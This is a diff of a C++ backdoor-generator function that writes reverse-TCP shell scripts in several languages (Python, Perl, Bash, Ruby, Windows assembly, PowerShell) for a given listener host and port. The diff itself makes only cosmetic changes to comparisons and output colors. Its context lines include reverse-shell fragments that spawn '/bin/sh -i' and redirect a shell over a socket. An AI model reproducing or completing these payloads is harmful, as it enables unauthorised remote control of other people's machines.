@@ -3,7 +3,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
  
     char ext[5]; string output;
     
-    if (strcmp(backdoor,"backdoors/unix/python/reverse_tcp") == 0) {
+    if (!strcmp(backdoor,"backdoors/unix/python/reverse_tcp")) {
         
         strcpy(ext, ".py");
 
@@ -23,7 +23,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
                     "p=subprocess.call([\"/bin/sh\",\"-i\"]);\n";
     }
 
-    else if (strcmp(backdoor,"backdoors/unix/perl/reverse_tcp") == 0) {
+    else if (!strcmp(backdoor,"backdoors/unix/perl/reverse_tcp")) {
        
         strcpy(ext, ".pl");
 
@@ -35,7 +35,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
 
     }
     
-    else if (strcmp(backdoor,"backdoors/unix/bash/reverse_tcp") == 0) {
+    else if (!strcmp(backdoor,"backdoors/unix/bash/reverse_tcp")) {
 
         strcpy(ext, ".sh");
 
@@ -46,7 +46,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
         output+=    ";sh <&46 >&46 2>&46";
     }
     
-    else if (strcmp(backdoor,"backdoors/unix/ruby/reverse_tcp") == 0) {
+    else if (!strcmp(backdoor,"backdoors/unix/ruby/reverse_tcp")) {
         
         strcpy(ext, ".rb");
 
@@ -81,7 +81,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
                     "end\n";
     }
 
-    else if (strcmp(backdoor,"backdoors/windows/asm/reverse_tcp") == 0) {
+    else if (!strcmp(backdoor,"backdoors/windows/asm/reverse_tcp")) {
 
         strcpy(ext, ".s");
 
@@ -141,7 +141,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
                     "end start\n";
     }
 
-    else if (strcmp(backdoor,"backdoors/windows/ps/reverse_tcp") == 0) {
+    else if (!strcmp(backdoor,"backdoors/windows/ps/reverse_tcp")) {
 
         strcpy(ext, ".ps1");
 
@@ -153,7 +153,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
     }
 
     else { 
-        printf("Error!\n"); 
+        red(); printf("Error!\n"); 
         return; 
     }
 
@@ -169,8 +169,10 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
     outfile.close();
 
     char *path = NULL; path = getcwd(NULL, 0);
+
     if ( path != NULL )
-        rlutil::setColor(2); // Green Color
+        green();
+    
         #ifdef nt
             cout << "\n\tExploit Location : " << path << "\\" << filename << "\n\n";
         #else
